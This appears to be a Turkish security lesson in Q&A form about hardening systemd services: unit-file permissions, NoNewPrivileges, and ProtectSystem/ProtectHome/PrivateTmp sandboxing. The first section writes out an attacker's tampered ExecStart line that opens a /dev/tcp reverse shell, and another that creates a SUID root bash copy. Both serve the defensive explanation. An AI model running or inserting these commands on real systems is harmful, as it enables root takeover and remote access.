# Gün 136: Linux Servisleri ve Systemd Güvenliği — Soru & Cevap

---

## SORU 1

### 1. Soru Başlığı ve Tanımı
**Systemd Unit Dosyası İzinleri, ExecStart Tahrifatı ve Yetki Yükseltme (MITRE ATT&CK T1543.002 / CWE-732)**  
Sistem üzerinde sınırlı yetkiye sahip bir saldırganın, `/etc/systemd/system/` veya altındaki servis unit dosyalarının izinlerinin gevşek (`0666` veya `developer:developer`) bırakılmasını istismar ederek `root` yetkilerine yükselmesi ve sistemde kalıcılık (persistence) sağlaması mekanizması nasıl çalışır? Bu saldırı vektörü nasıl tespit edilir ve ortadan kaldırılır?

### 2. Derinlemesine Teknik Analiz
Linux işletim sistemlerinde `systemd` (PID 1), servisleri başlatırken doğrudan `root` (UID 0, GID 0) yetkileriyle hareket eder ve servis dosyasındaki yönergeleri yorumlar.
Bir servis birim dosyasında en kritik direktif `ExecStart=` alanıdır. Bu alan, servis ayağa kalktığında çalıştırılacak ikili dosyayı veya komut zincirini tanımlar.

Eğer `/etc/systemd/system/myapp.service` dosyasının izinleri hatalı biçimde `0666` (herkese yazılabilir) veya sahibi `developer` gibi yetkisiz bir kullanıcı/grup olarak yapılandırılmışsa:
1. Sistemde herhangi bir yolla (düşük yetkili web kabuğu, SSH erişimi, stajyer hesabı) yerel erişim elde eden saldırgan, doğrudan bu dosyayı açar:
   ```ini
   # Orijinal satır:
   # ExecStart=/usr/local/bin/myapp
   # Saldırganın tahrif ettiği satır:
   ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
   ```
2. Ya da saldırgan binary dosyasını değiştirmek yerine SUID biti verilmiş bir kabuk oluşturabilir:
   ```ini
   ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"
   ```
3. Servis bir sonraki sefer yeniden başlatıldığında (`systemctl restart myapp` veya sunucu boot olduğunda), systemd PID 1 olarak bu komutu çalıştırır. Saldırgan `/tmp/rootbash -p` ile anında tam yetkili root kabuğuna kavuşur.
4. Bu teknik, MITRE ATT&CK matrisinde **T1543.002 (Create or Modify System Process: Systemd Service)** olarak sınıflandırılır.

### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir e-ticaret şirketinin DevOps mühendisleri, CI/CD pipeline'ı üzerinden mikroservis güncellemelerini kolayca yapabilmek için `/etc/systemd/system/order-worker.service` dosyasının sahibini `gitlab-runner:gitlab-runner` yapmış ve `chmod 0777` izinleri vermiştir. `gitlab-runner` hesabına sızan bir saldırgan, dosyanın içine bir arka kapı enjekte etmiş ve gece sunucu otomatik güncellenip yeniden başladığında root yetkisi elde etmiştir.

**Pratik Çözüm:**
1. Servis dosyalarının izin ve sahiplikleri kesinlikle `root:root` ve `0644` olarak sabitlenmelidir:
   ```bash
   sudo chown root:root /etc/systemd/system/order-worker.service
   sudo chmod 0644 /etc/systemd/system/order-worker.service
   ```
2. CI/CD'nin servis dosyasını doğrudan düzenlemesi engellenmelidir; bunun yerine yapılandırma değişiklikleri git deposunda sürümlendirilmeli ve Ansible/Puppet gibi yetkili konfigürasyon yöneticileriyle dağıtılmalıdır.
3. Otomatik denetim betiğimiz (`systemd_security_cli.py audit`) günlük cron ile çalıştırılarak gevşek izinli unit dosyaları derhal SIEM sistemine alarmlanmalıdır.

### 4. Ustanın Çırağa Tavsiyesi
Çırak! "Geliştiriciler kolay test etsin" ya da "Pipeline hata veriyor izin verelim" diyerek `/etc/systemd/system/` altına `777` veya `666` izni veren birini görürsen bil ki o sunucuya root backdoor döşüyordur. Systemd PID 1'dir; onun okuduğu dosyaya yazabilen herkes sunucunun gerçek sahibidir. Asla taviz verme; `root:root 0644` kuralı kırmızı çizgindir.

---

## SORU 2

### 1. Soru Başlığı ve Tanımı
**`NoNewPrivileges=yes` Direktifinin Çekirdek (Kernel) Düzeyindeki Güvenlik Bariyeri (CWE-250 / MITRE ATT&CK T1548)**  
Bir servis `User=appuser` direktifiyle kısıtlı bir kullanıcı kimliği altında çalıştırılsa dahi, `NoNewPrivileges=yes` tanımlanmadığı takdirde sistemdeki SUID ikili dosyalar veya yerel çekirdek açıkları üzerinden yetki yükseltme saldırılarına nasıl maruz kalır? Çekirdeğin `PR_SET_NO_NEW_PRIVS` mekanizması bu riski nasıl bertaraf eder?

### 2. Derinlemesine Teknik Analiz
Geleneksel Linux süreç yürütme modelinde, bir süreç `execve()` sistem çağrısıyla yeni bir program çalıştırdığında, eğer çalıştırılan ikili dosyanın dosya modunda SUID (SetUID, `04000`) biti varsa (örneğin `/usr/bin/passwd`, `/usr/bin/newgrp`, `/usr/bin/pkexec`), yeni süreç dosyanın sahibi olan kullanıcının (genellikle `root`) yetkileriyle başlar.

Bir web uygulaması ya da API servisi `User=appuser` olarak çalıştırılsa bile:
1. Uygulamada bir Command Injection (Komut Enjeksiyonu) veya Remote Code Execution (RCE) açığı oluştuğunda saldırgan `appuser` olarak sisteme girer.
2. `appuser`, sunucu üzerindeki SUID ikili dosyaları (veya GTFOBins kapsamındaki `/bin/su`, `/usr/bin/sudo`, yerel SUID araçları, PwnKit/CVE-2021-4034 istismarları) çağırarak doğrudan `root` UID 0'a geçiş yapabilir.

İşte tam bu noktada Linux 3.5 çekirdeği ile gelen ve systemd'nin `NoNewPrivileges=yes` direktifiyle etkinleştirilen **`PR_SET_NO_NEW_PRIVS`** devreye girer:
- Systemd servisi çatallamadan (fork) önce çekirdeğe `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` çağrısı gönderir.
- Bu bayrak çekirdek tarafından sürecin `task_struct` yapısına işlenir ve **asla geri alınamaz (irreversible)**.
- Süreç veya onun çatallayacağı hiçbir çocuk süreç, `execve()` çağrısı sırasında SUID/SGID bitlerini etkinleştiremez. Çekirdek, dosyadaki SUID bitini tamamen görmezden gelir ve programı çağıran kullanıcının (`appuser`) yetkileriyle çalışmaya zorlar.
- Ayrıca `seccomp` filtrelerinin yetkisiz kullanıcılar tarafından çekirdeğe yüklenmesi sırasında da bu bayrak zorunludur.

### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Kurumsal bir Apache Tomcat servisi `User=tomcat` olarak çalışmaktadır. Tomcat üzerindeki bir deserialization zafiyeti ile saldırgan sunucuda kod çalıştırmış ve sistemde eski bir sudoers hatası veya SUID izinli yerel bir script bulmuştur. Saldırgan bu scripti çağırarak saniyeler içinde root olmuştur.

**Pratik Çözüm:**
Tomcat servisinin birim dosyasına veya drop-in override dosyasına (`/etc/systemd/system/tomcat.service.d/override.conf`) şu satır eklenir:
```ini
[Service]
NoNewPrivileges=yes
```
Ardından:
```bash
sudo systemctl daemon-reload
sudo systemctl restart tomcat
```
Artık saldırgan Tomcat sürecinden SUID dosyaları çalıştırsa bile `Permission Denied` veya yetki yükseltilmeksizin standart `tomcat` yetkileriyle karşılaşır; yetki yükseltme zinciri çekirdek düzeyinde kırılır.

### 4. Ustanın Çırağa Tavsiyesi
Evlat! "Ben servisi yetkisiz kullanıcıya çektim, artık root olamazlar" yanılgısına düşen binlerce yönetici fidye yazılımlarına teslim oldu. Yetkisiz kullanıcı, sunucu üzerinde SUID bir binary bulduğu anda roottur! `NoNewPrivileges=yes` direktifi, çekirdeğin bu kapıyı kilitleyen en zarif anahtarıdır. İstisnasız her üretim servisinde bu direktif aktif olmalıdır.

---

## SORU 3

### 1. Soru Başlığı ve Tanımı
**Systemd Sandboxing: `ProtectSystem=strict`, `ProtectHome=yes` ve `PrivateTmp=yes` ile Mount Namespace İzolasyonu**  
Bir Linux sunucusunda çalışan hassas bir backend servisinde RCE zafiyeti tetiklendiğinde; dosya sisteminin tahrif edilmesini, SSH anahtarlarının ve veritabanı yedeklerinin çalınmasını ve ortak `/tmp` alanı üzerinden gerçekleştirilen yarış koşulu (race condition) saldırılarını bu üç systemd direktifi nasıl engeller? Servisin meşru yazma gereksinimleri (`ReadWritePaths=`) nasıl yapılandırılmalıdır?

### 2. Derinlemesine Teknik Analiz
Linux çekirdeğinin sunduğu **Mount Namespace (CLONE_NEWNS)**, her sürece dosya sisteminin bağımsız bir kopyasını veya farklı bağlanmış (mounted) bir görünümünü sunabilir. Systemd, bu çekirdek özelliğini arkasına alarak şu üç devrimsel izolasyonu sağlar:

1. **`ProtectSystem=strict`:**
   - Servis süreci başlatılırken yeni bir mount namespace oluşturulur.
   - Bütün dosya hiyerarşisi (`/usr`, `/boot`, `/etc`, `/bin`, `/sbin`, `/lib`) salt-okunur (read-only, `MS_RDONLY`) olarak remount edilir.
   - Saldırgan servisi ele geçirdiğinde `/etc/passwd`, `/etc/shadow`, `/etc/crontab` gibi kritik dosyalara ekleme yapamaz, kütüphanelere trojan gömemez (`chmod` veya `echo` komutları `Read-only file system` hatası fırlatır).
   
2. **`ProtectHome=yes`:**
   - Kullanıcıların ve root kullanıcısının ev dizinleri (`/home`, `/root`, `/run/user`) servis namespace'i içerisinde tamamen boşaltılır veya erişilemez (`MS_NODEV | MS_NOEXEC`) bir geçici dosya sistemi ile maskelenir.
   - Saldırgan sistemdeki yöneticilerin `~/.ssh/id_rsa` anahtarlarını, AWS/cloud credential dosyalarını (`~/.aws/credentials`) ve komut geçmişlerini okuyamaz (CWE-200).

3. **`PrivateTmp=yes`:**
   - Servise özel yalıtılmış bir `/tmp` ve `/var/tmp` mount edilir (örneğin `/tmp/systemd-private-...-myapp.service-.../tmp`).
   - Sistem genelindeki diğer kullanıcılar bu dosyaları göremez; servis de diğer süreçlerin geçici dosyalarını göremez.
   - Bu sayede ortak `/tmp` üzerinde sıkça görülen sembolik bağ saldırıları (symlink attacks) ve geçici dosya yarış koşulları (race conditions / CWE-377) engellenir.

### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir ödeme geçidi API servisi (`payment-api.service`) ele geçirilmiştir. Servisin meşru olarak sadece `/var/log/payment/` dizinine log yazması ve `/var/lib/payment/` dizininde oturum dosyalarını tutması gerekmektedir. Ancak varsayılan yapılandırmada saldırgan `/etc/hosts` dosyasını değiştirmiş ve `/home/deploy/.ssh/id_rsa` dosyasını çalarak diğer sunuculara sıçramıştır (lateral movement).

**Pratik Çözüm:**
Servis birim dosyası aşağıdaki gibi sıkılaştırılır:
```ini
[Unit]
Description=Odeme Gecidi API Servisi
After=network.target

[Service]
Type=simple
User=payment_svc
Group=payment_svc
ExecStart=/opt/payment/bin/api-server

# Sandboxing direktifleri
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectControlGroups=yes

# Meşru yazma gereksinimi olan dizinler beyaz listeye alınır:
ReadWritePaths=/var/log/payment /var/lib/payment

[Install]
WantedBy=multi-user.target
```
Bu sayede servis `/var/log/payment` ve `/var/lib/payment` dizinlerine sorunsuz yazarken, sistemin geri kalanı saldırganın gözünde beton dökülmüş gibi salt-okunur ve erişilmez kalır.

### 4. Ustanın Çırağa Tavsiyesi
Çırak! Bir servis yazma iznine ihtiyaç duyar, evet; ama bu izin bütün sunucu olamaz. Bir cerrah nasıl ameliyat sırasında yalnızca kesmesi gereken bölgeyi açık bırakıp geri kalan her yeri steril örtülerle izole ederse; sen de `ProtectSystem=strict` ile tüm sistemi kapatacak, yalnızca `ReadWritePaths=` ile servisin nefes alacağı iki odayı açacaksın. Güvenlik mimarlığı işte bu cerrahi hassasiyettir.
